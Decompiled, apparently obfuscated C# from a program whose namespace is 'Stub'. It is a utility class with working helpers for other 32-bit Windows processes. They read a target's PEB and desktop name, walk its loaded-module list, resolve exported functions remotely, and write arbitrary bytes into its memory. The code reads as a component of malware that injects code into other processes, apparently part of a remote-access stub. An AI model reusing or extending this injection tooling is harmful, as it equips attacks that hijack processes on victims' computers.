using System;
using System.Linq;
using System.Runtime.InteropServices;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000D4 RID: 212
	internal sealed class Utils32
	{
		// Token: 0x0600033C RID: 828 RVA: 0x0001E2CC File Offset: 0x0001C4CC
		public static string GetProcessDesktopName32(IntPtr hProcess)
		{
			string text;
			if (hProcess == IntPtr.Zero)
			{
				text = null;
			}
			else
			{
				InternalStructs.PROCESS_BASIC_INFORMATION process_BASIC_INFORMATION = default(InternalStructs.PROCESS_BASIC_INFORMATION);
				uint num = (uint)Marshal.SizeOf<InternalStructs.PROCESS_BASIC_INFORMATION>(process_BASIC_INFORMATION);
				uint num2 = 0U;
				UIntPtr zero = UIntPtr.Zero;
				int num3 = NativeMethods.NtQueryPbi32(hProcess, InternalStructs.PROCESSINFOCLASS.ProcessBasicInformation, ref process_BASIC_INFORMATION, num, ref num2);
				if (num3 != 0)
				{
					text = null;
				}
				else if (process_BASIC_INFORMATION.PebBaseAddress == IntPtr.Zero)
				{
					text = null;
				}
				else
				{
					IntPtr rtl = InternalStructs32.GetRTL32(process_BASIC_INFORMATION.PebBaseAddress);
					int num4 = Marshal.SizeOf(typeof(InternalStructs.UINTRESULT));
					IntPtr intPtr = Marshal.AllocHGlobal(num4);
					if (!NativeMethods.ReadProcessMemory(hProcess, rtl, intPtr, (UIntPtr)((ulong)((long)num4)), ref zero))
					{
						Marshal.FreeHGlobal(intPtr);
						text = null;
					}
					else
					{
						IntPtr intPtr2 = (IntPtr)((long)((ulong)Marshal.PtrToStructure<InternalStructs.UINTRESULT>(intPtr).Value));
						Marshal.FreeHGlobal(intPtr);
						int num5 = Marshal.SizeOf<InternalStructs32.RTL_USER_PROCESS_PARAMETERS32>();
						IntPtr intPtr3 = Marshal.AllocHGlobal(num5);
						if (!NativeMethods.ReadProcessMemory(hProcess, intPtr2, intPtr3, (UIntPtr)((ulong)((long)num5)), ref zero))
						{
							Marshal.FreeHGlobal(intPtr3);
							text = null;
						}
						else
						{
							InternalStructs32.RTL_USER_PROCESS_PARAMETERS32 rtl_USER_PROCESS_PARAMETERS = Marshal.PtrToStructure<InternalStructs32.RTL_USER_PROCESS_PARAMETERS32>(intPtr3);
							Marshal.FreeHGlobal(intPtr3);
							IntPtr intPtr4 = Marshal.AllocHGlobal((int)rtl_USER_PROCESS_PARAMETERS.DesktopInfo.Length);
							if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)((long)((ulong)rtl_USER_PROCESS_PARAMETERS.DesktopInfo.Buffer)), intPtr4, (UIntPtr)((uint)rtl_USER_PROCESS_PARAMETERS.DesktopInfo.Length), ref zero))
							{
								Marshal.FreeHGlobal(intPtr4);
								text = null;
							}
							else
							{
								string text2 = Marshal.PtrToStringUni(intPtr4, (int)(rtl_USER_PROCESS_PARAMETERS.DesktopInfo.Length / 2));
								Marshal.FreeHGlobal(intPtr4);
								text = text2;
							}
						}
					}
				}
			}
			return text;
		}

		// Token: 0x0600033D RID: 829 RVA: 0x0001E464 File Offset: 0x0001C664
		public static uint GetRemoteModuleHandle32Bit(IntPtr hProcess, string DllBaseName, int max_flink_count = 600)
		{
			if (hProcess == IntPtr.Zero)
			{
				throw new Exception("The supplied hProcess is Null!");
			}
			InternalStructs.PROCESS_BASIC_INFORMATION process_BASIC_INFORMATION = default(InternalStructs.PROCESS_BASIC_INFORMATION);
			uint num = (uint)Marshal.SizeOf<InternalStructs.PROCESS_BASIC_INFORMATION>(process_BASIC_INFORMATION);
			uint num2 = 0U;
			UIntPtr zero = UIntPtr.Zero;
			int num3 = NativeMethods.NtQueryPbi32(hProcess, InternalStructs.PROCESSINFOCLASS.ProcessBasicInformation, ref process_BASIC_INFORMATION, num, ref num2);
			if (num3 != 0)
			{
				throw new Exception("couldnt read PBI. ERR CODE: " + num3.ToString());
			}
			uint num4;
			if (process_BASIC_INFORMATION.PebBaseAddress == IntPtr.Zero)
			{
				num4 = 0U;
			}
			else
			{
				IntPtr ldr = InternalStructs32.GetLdr32(process_BASIC_INFORMATION.PebBaseAddress);
				int num5 = Marshal.SizeOf(typeof(InternalStructs.UINTRESULT));
				IntPtr intPtr = Marshal.AllocHGlobal(num5);
				if (!NativeMethods.ReadProcessMemory(hProcess, ldr, intPtr, (UIntPtr)((ulong)((long)num5)), ref zero))
				{
					Marshal.FreeHGlobal(intPtr);
					throw new Exception("couldnt read pLdrData. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
				}
				IntPtr intPtr2 = (IntPtr)((long)((ulong)Marshal.PtrToStructure<InternalStructs.UINTRESULT>(intPtr).Value));
				Marshal.FreeHGlobal(intPtr);
				if (intPtr2 == IntPtr.Zero)
				{
					num4 = 0U;
				}
				else
				{
					if (!NativeMethods.ReadProcessMemory(hProcess, ldr, intPtr, (UIntPtr)((ulong)((long)num5)), ref zero))
					{
						Marshal.FreeHGlobal(intPtr);
						throw new Exception("couldnt read pLdrData. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
					}
					int num6 = Marshal.SizeOf(typeof(InternalStructs32.PEB_LDR_DATA32));
					IntPtr intPtr3 = Marshal.AllocHGlobal(num6);
					if (!NativeMethods.ReadProcessMemory(hProcess, intPtr2, intPtr3, (UIntPtr)((ulong)((long)num6)), ref zero))
					{
						Marshal.FreeHGlobal(intPtr3);
						throw new Exception("couldnt read ldr32. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
					}
					InternalStructs32.PEB_LDR_DATA32 peb_LDR_DATA = Marshal.PtrToStructure<InternalStructs32.PEB_LDR_DATA32>(intPtr3);
					Marshal.FreeHGlobal(intPtr3);
					uint num7 = peb_LDR_DATA.InLoadOrderModuleList.Flink;
					uint num8 = (uint)((int)ldr + (int)Marshal.OffsetOf(typeof(InternalStructs32.PEB_LDR_DATA32), "InLoadOrderModuleList"));
					int num9 = Marshal.SizeOf(typeof(InternalStructs32.LDR_DATA_TABLE_ENTRY32_SNAP));
					IntPtr intPtr4 = Marshal.AllocHGlobal(num9);
					uint num10 = 0U;
					uint num11 = 0U;
					while (num7 != num8 && (ulong)num11 < (ulong)((long)max_flink_count))
					{
						num11 += 1U;
						if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)((long)((ulong)num7)), intPtr4, (UIntPtr)((ulong)((long)num9)), ref zero))
						{
							break;
						}
						InternalStructs32.LDR_DATA_TABLE_ENTRY32_SNAP ldr_DATA_TABLE_ENTRY32_SNAP = Marshal.PtrToStructure<InternalStructs32.LDR_DATA_TABLE_ENTRY32_SNAP>(intPtr4);
						if (DllBaseName == null)
						{
							num10 = ldr_DATA_TABLE_ENTRY32_SNAP.DllBase;
							break;
						}
						num7 = ldr_DATA_TABLE_ENTRY32_SNAP.InLoadOrderLinks.Flink;
						if ((int)(ldr_DATA_TABLE_ENTRY32_SNAP.BaseDllName.Length / 2) == DllBaseName.Length)
						{
							IntPtr intPtr5 = Marshal.AllocHGlobal((int)ldr_DATA_TABLE_ENTRY32_SNAP.BaseDllName.Length);
							if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)((long)((ulong)ldr_DATA_TABLE_ENTRY32_SNAP.BaseDllName.Buffer)), intPtr5, (UIntPtr)((uint)ldr_DATA_TABLE_ENTRY32_SNAP.BaseDllName.Length), ref zero))
							{
								Marshal.FreeHGlobal(intPtr5);
								break;
							}
							string text = Marshal.PtrToStringUni(intPtr5, (int)(ldr_DATA_TABLE_ENTRY32_SNAP.BaseDllName.Length / 2));
							Marshal.FreeHGlobal(intPtr5);
							if (text.ToLower() == DllBaseName.ToLower())
							{
								num10 = ldr_DATA_TABLE_ENTRY32_SNAP.DllBase;
								break;
							}
						}
					}
					Marshal.FreeHGlobal(intPtr4);
					num4 = num10;
				}
			}
			return num4;
		}

		// Token: 0x0600033E RID: 830 RVA: 0x0001E7A0 File Offset: 0x0001C9A0
		private static string ReadRemoteAnsiString32(IntPtr hProcess, IntPtr lpAddress)
		{
			string text = "";
			UIntPtr zero = UIntPtr.Zero;
			IntPtr intPtr = Marshal.AllocHGlobal(1);
			while (NativeMethods.ReadProcessMemory(hProcess, lpAddress, intPtr, (UIntPtr)1UL, ref zero))
			{
				byte b = Marshal.ReadByte(intPtr);
				if (b == 0)
				{
					return text;
				}
				string text2 = text;
				char c = (char)b;
				text = text2 + c.ToString();
				lpAddress += 1;
			}
			Marshal.FreeHGlobal(intPtr);
			throw new Exception("couldnt read AnsiString. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
		}

		// Token: 0x0600033F RID: 831 RVA: 0x0001E830 File Offset: 0x0001CA30
		public static bool WriteBytesToProcess32(IntPtr handle, IntPtr address, byte[] data)
		{
			IntPtr intPtr = Marshal.AllocHGlobal(data.Length);
			Marshal.Copy(data, 0, intPtr, data.Length);
			IntPtr intPtr2;
			bool flag = NativeMethods.WriteProcessMemory(handle, address, intPtr, (IntPtr)data.Length, out intPtr2);
			Marshal.FreeHGlobal(intPtr);
			return flag && intPtr2 == (IntPtr)data.Length;
		}

		// Token: 0x06000340 RID: 832 RVA: 0x0001E880 File Offset: 0x0001CA80
		public static uint GetNtHeader32Addr(IntPtr hProcess, uint hModule)
		{
			int num = Marshal.SizeOf(typeof(InternalStructs.IMAGE_DOS_HEADER));
			IntPtr intPtr = Marshal.AllocHGlobal(num);
			UIntPtr zero = UIntPtr.Zero;
			if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)((long)((ulong)hModule)), intPtr, (UIntPtr)((ulong)((long)num)), ref zero))
			{
				Marshal.FreeHGlobal(intPtr);
				throw new Exception("couldnt read DosHeader. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
			}
			InternalStructs.IMAGE_DOS_HEADER image_DOS_HEADER = Marshal.PtrToStructure<InternalStructs.IMAGE_DOS_HEADER>(intPtr);
			Marshal.FreeHGlobal(intPtr);
			return hModule + (uint)image_DOS_HEADER.e_lfanew;
		}

		// Token: 0x06000341 RID: 833 RVA: 0x0001E904 File Offset: 0x0001CB04
		public static InternalStructs32.IMAGE_NT_HEADERS32 GetNtHeader32(IntPtr hProcess, uint hModule)
		{
			UIntPtr zero = UIntPtr.Zero;
			int num = Marshal.SizeOf(typeof(InternalStructs32.IMAGE_NT_HEADERS32));
			IntPtr intPtr = Marshal.AllocHGlobal(num);
			if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)((long)((ulong)Utils32.GetNtHeader32Addr(hProcess, hModule))), intPtr, (UIntPtr)((ulong)((long)num)), ref zero))
			{
				Marshal.FreeHGlobal(intPtr);
				throw new Exception("couldnt read NTHeader. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
			}
			InternalStructs32.IMAGE_NT_HEADERS32 image_NT_HEADERS = Marshal.PtrToStructure<InternalStructs32.IMAGE_NT_HEADERS32>(intPtr);
			Marshal.FreeHGlobal(intPtr);
			return image_NT_HEADERS;
		}

		// Token: 0x06000342 RID: 834 RVA: 0x0001E988 File Offset: 0x0001CB88
		public static uint GetRemoteProcAddress32Bit(IntPtr hProcess, uint hModule, string FunctionName)
		{
			if (hModule == 0U)
			{
				throw new Exception("couldnt read hModule is null or 0.");
			}
			UIntPtr zero = UIntPtr.Zero;
			InternalStructs32.IMAGE_NT_HEADERS32 ntHeader = Utils32.GetNtHeader32(hProcess, hModule);
			InternalStructs.IMAGE_DATA_DIRECTORY image_DATA_DIRECTORY = ntHeader.OptionalHeader.DataDirectory[0];
			uint num;
			if (image_DATA_DIRECTORY.Size == 0U || image_DATA_DIRECTORY.VirtualAddress == 0U)
			{
				num = 0U;
			}
			else
			{
				int num2 = Marshal.SizeOf(typeof(InternalStructs.IMAGE_EXPORT_DIRECTORY));
				IntPtr intPtr = Marshal.AllocHGlobal(num2);
				if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)((long)((ulong)(hModule + image_DATA_DIRECTORY.VirtualAddress))), intPtr, (UIntPtr)((ulong)((long)num2)), ref zero))
				{
					Marshal.FreeHGlobal(intPtr);
					throw new Exception("couldnt read IMAGE EXPORT DIRECTORY. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
				}
				InternalStructs.IMAGE_EXPORT_DIRECTORY image_EXPORT_DIRECTORY = Marshal.PtrToStructure<InternalStructs.IMAGE_EXPORT_DIRECTORY>(intPtr);
				Marshal.FreeHGlobal(intPtr);
				if (image_EXPORT_DIRECTORY.NumberOfNames == 0U)
				{
					num = 0U;
				}
				else
				{
					int num3 = (int)(image_EXPORT_DIRECTORY.NumberOfFunctions * (uint)Marshal.SizeOf(typeof(int)));
					IntPtr intPtr2 = Marshal.AllocHGlobal(num3);
					if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)((long)((ulong)(hModule + image_EXPORT_DIRECTORY.AddressOfFunctions))), intPtr2, (UIntPtr)((ulong)((long)num3)), ref zero))
					{
						Marshal.FreeHGlobal(intPtr2);
						throw new Exception("couldnt read RVA table. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
					}
					uint[] array = new uint[image_EXPORT_DIRECTORY.NumberOfFunctions];
					for (int i = 0; i < (int)image_EXPORT_DIRECTORY.NumberOfFunctions; i++)
					{
						array[i] = Marshal.PtrToStructure<InternalStructs.UINTRESULT>(intPtr2 + i * 4).Value;
					}
					Marshal.FreeHGlobal(intPtr2);
					int num4 = (int)(image_EXPORT_DIRECTORY.NumberOfFunctions * (uint)Marshal.SizeOf(typeof(short)));
					IntPtr intPtr3 = Marshal.AllocHGlobal(num4);
					if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)((long)((ulong)(hModule + image_EXPORT_DIRECTORY.AddressOfNameOrdinals))), intPtr3, (UIntPtr)((ulong)((long)num4)), ref zero))
					{
						Marshal.FreeHGlobal(intPtr3);
						throw new Exception("couldnt read ORD table. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
					}
					ushort[] array2 = new ushort[image_EXPORT_DIRECTORY.NumberOfFunctions];
					for (int j = 0; j < (int)image_EXPORT_DIRECTORY.NumberOfFunctions; j++)
					{
						array2[j] = Marshal.PtrToStructure<InternalStructs.USHORTRESULT>(intPtr3 + j * 2).Value;
					}
					Marshal.FreeHGlobal(intPtr3);
					int num5 = (int)(image_EXPORT_DIRECTORY.NumberOfNames * (uint)Marshal.SizeOf(typeof(int)));
					IntPtr intPtr4 = Marshal.AllocHGlobal(num5);
					if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)((long)((ulong)(hModule + image_EXPORT_DIRECTORY.AddressOfNames))), intPtr4, (UIntPtr)((ulong)((long)num5)), ref zero))
					{
						Marshal.FreeHGlobal(intPtr4);
						throw new Exception("couldnt read NAME table. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
					}
					uint[] array3 = new uint[image_EXPORT_DIRECTORY.NumberOfNames];
					for (int k = 0; k < (int)image_EXPORT_DIRECTORY.NumberOfNames; k++)
					{
						array3[k] = Marshal.PtrToStructure<InternalStructs.UINTRESULT>(intPtr4 + k * 4).Value;
					}
					Marshal.FreeHGlobal(intPtr4);
					int num6 = FunctionName.Length + 1;
					IntPtr intPtr5 = Marshal.AllocHGlobal(num6);
					uint num7 = 0U;
					for (int l = 0; l < array3.Length; l++)
					{
						if (!NativeMethods.ReadProcessMemory(hProcess, (IntPtr)((long)((ulong)(hModule + array3[l]))), intPtr5, (UIntPtr)((ulong)((long)num6)), ref zero))
						{
							Marshal.FreeHGlobal(intPtr5);
							throw new Exception("couldnt read name buffer. ERR CODE: " + Marshal.GetLastWin32Error().ToString());
						}
						byte b = Marshal.ReadByte(intPtr5 + num6 - 2);
						if (Marshal.ReadByte(intPtr5 + num6 - 1) == 0 && b > 0)
						{
							uint num8 = array[(int)array2[l]];
							string text = Marshal.PtrToStringAnsi(intPtr5);
							if (text == FunctionName)
							{
								if (num8 < image_DATA_DIRECTORY.VirtualAddress || num8 >= image_DATA_DIRECTORY.VirtualAddress + image_DATA_DIRECTORY.Size)
								{
									num7 = hModule + num8;
									IL_04C4:
									Marshal.FreeHGlobal(intPtr5);
									return num7;
								}
								string text2 = Utils32.ReadRemoteAnsiString32(hProcess, (IntPtr)((long)((ulong)(hModule + num8))));
								if (!text2.Contains("."))
								{
									Marshal.FreeHGlobal(intPtr5);
									throw new Exception("Couldnt the Forwarder info!");
								}
								string[] array4 = text2.Split(new char[] { '.' });
								string text3 = string.Join(".", array4.Take(array4.Length - 1).ToArray<string>()) + ".dll";
								string text4 = array4[array4.Length - 1];
								if (text4.Contains("#"))
								{
									Marshal.FreeHGlobal(intPtr5);
									throw new Exception("Ordinal forwarder function is not supported at this time!");
								}
								uint remoteModuleHandle32Bit = Utils32.GetRemoteModuleHandle32Bit(hProcess, text3, 600);
								if (remoteModuleHandle32Bit == 0U)
								{
									Marshal.FreeHGlobal(intPtr5);
									throw new Exception("Couldnt the Forwarder dll!");
								}
								return Utils32.GetRemoteProcAddress32Bit(hProcess, remoteModuleHandle32Bit, text4);
							}
						}
					}
					goto IL_04C4;
				}
			}
			return num;
		}

		// Token: 0x06000343 RID: 835 RVA: 0x000038B4 File Offset: 0x00001AB4
		public Utils32()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x06000344 RID: 836 RVA: 0x000038AD File Offset: 0x00001AAD
		static Utils32()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}
	}
}
